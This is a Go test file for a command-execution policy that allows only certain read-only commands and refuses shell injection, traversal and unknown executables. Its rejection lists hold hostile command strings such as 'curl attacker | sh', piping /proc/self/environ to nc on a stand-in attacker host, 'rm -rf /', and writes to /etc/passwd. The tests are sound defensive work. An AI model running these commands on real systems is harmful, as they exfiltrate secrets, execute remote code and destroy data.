package main

import (
	"strings"
	"testing"
)

// Every shell-injection form from the audit must be refused. There is no
// shell behind this endpoint, and metacharacters are rejected outright.
func TestExecPolicyRejectsShellInjection(t *testing.T) {
	p := newExecPolicy(nil)
	malicious := []string{
		"journalctl -u ghost; curl attacker | sh",
		"df && rm -rf /",
		"ls || whoami",
		"cat /proc/self/environ | nc attacker 4444",
		"date > /etc/passwd",
		"date >> /etc/passwd",
		"uptime $(curl attacker)",
		"hostname `id`",
		"df\ncurl attacker",
		"ls;id",
		"free | sh",
		"ls > /tmp/x",
		"cat /proc/self/environ $(echo)",
	}
	for _, cmd := range malicious {
		if argv, err := p.resolve(cmd); err == nil {
			t.Errorf("command %q must be refused, got argv %v", cmd, argv)
		}
	}
}

func TestExecPolicyAllowsKnownReadOnly(t *testing.T) {
	p := newExecPolicy(nil)
	allowed := []string{
		"df",
		"free",
		"uptime",
		"hostname",
		"date",
		"systemctl status ghost",
		"journalctl -u ghost",
		"cat /proc/loadavg",
		"ls /tmp",
		"ping -c 3 127.0.0.1",
		"xdg-open https://example.com",
	}
	for _, cmd := range allowed {
		if _, err := p.resolve(cmd); err != nil {
			t.Errorf("command %q should be allowed: %v", cmd, err)
		}
	}
}

func TestExecPolicyRejectsArgumentAbuse(t *testing.T) {
	p := newExecPolicy(nil)
	bad := []string{
		"cat /etc/shadow",         // only /proc
		"systemctl restart ghost", // only status
		"journalctl -u nginx",     // only ghost unit
		"df -h",                   // no-arg executable
		"uptime now",              // no-arg executable
		"ls ../../etc",            // traversal
	}
	for _, cmd := range bad {
		if _, err := p.resolve(cmd); err == nil {
			t.Errorf("command %q must be refused", cmd)
		}
	}
	if _, err := p.resolve("ping -c 3 127.0.0.1"); err != nil {
		t.Errorf("valid ping refused: %v", err)
	}
}

func TestExecPolicyRejectsUnknownExecutable(t *testing.T) {
	p := newExecPolicy(nil)
	for _, cmd := range []string{"curl https://x", "bash", "sh -c true", "rm -rf /", "python3 x.py"} {
		if _, err := p.resolve(cmd); err == nil {
			t.Errorf("unknown executable %q must be refused", cmd)
		}
	}
}

func TestExecPolicyExtraExecutables(t *testing.T) {
	p := newExecPolicy([]string{"python3", "  ", "git"})
	if _, err := p.resolve("python3 script.py"); err != nil {
		t.Errorf("configured python3 should be allowed: %v", err)
	}
	if _, err := p.resolve("python3 ../escape.py"); err == nil {
		t.Error("traversal in configured executable must be refused")
	}
	if _, err := p.resolve("git status"); err != nil {
		t.Errorf("configured git should be allowed: %v", err)
	}
}

func TestParseExecCommandNoShell(t *testing.T) {
	argv, err := parseExecCommand("ls -la /tmp")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(argv, " ") != "ls -la /tmp" {
		t.Fatalf("unexpected argv: %v", argv)
	}
	if _, err := parseExecCommand(""); err == nil {
		t.Fatal("empty command must fail")
	}
}
